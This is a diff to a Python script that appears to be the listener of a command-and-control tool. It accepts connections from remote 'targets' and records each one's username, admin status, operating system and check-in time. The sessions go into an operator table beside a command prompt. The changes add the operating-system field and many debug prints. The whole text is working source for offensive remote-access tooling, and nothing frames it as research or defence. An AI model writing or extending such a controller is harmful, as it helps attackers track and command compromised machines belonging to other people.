@@ -90,7 +90,10 @@ def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
+    #communication_handler()
+    print('Prethread')
     t1 = threading.Thread(target=communication_handler)
+    print('Starting thread')
     t1.start()
 
 def target_comm_channel(target_id):
@@ -113,27 +116,40 @@ def target_comm_channel(target_id):
 
 def communication_handler():
     while True:
+        print('shhhhh')
         if kill_flag == 1:
-            break
+            quit()
         try:
             remote_target, remote_ip = sock.accept()
+            #remote_target.setblocking(False)
+            print('socket accepted')
             username = remote_target.recv(1024).decode()
+            print(username)
             admin = remote_target.recv(1024).decode()
+            print(admin)
+            op_sys = remote_target.recv(1024).decode()
+
+            print(op_sys)
             if admin == 1:
                 admin_value = 'Yes'
             elif username == 'root':
                 admin_value = 'Yes'
             else:
+                print('no')
                 admin_value = 'No'
+            print('post-admin')
             current_time = time.strftime("%H:%M:%S", time.localtime())
+            print(current_time)
             date = datetime.now()
+            print(date)
             time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
+            print(host_name)
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_value])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_value, op_sys])
                 print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
         except:
             pass
@@ -173,6 +189,7 @@ if __name__ == '__main__':
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+
     while True:
         try:
             command = input('Enter command#> ')
@@ -200,10 +217,10 @@ if __name__ == '__main__':
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
                     myTable = PrettyTable()
-                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Check-In Time']
+                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
+                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print(myTable)
                 if command.split(" ")[1] == '-i':
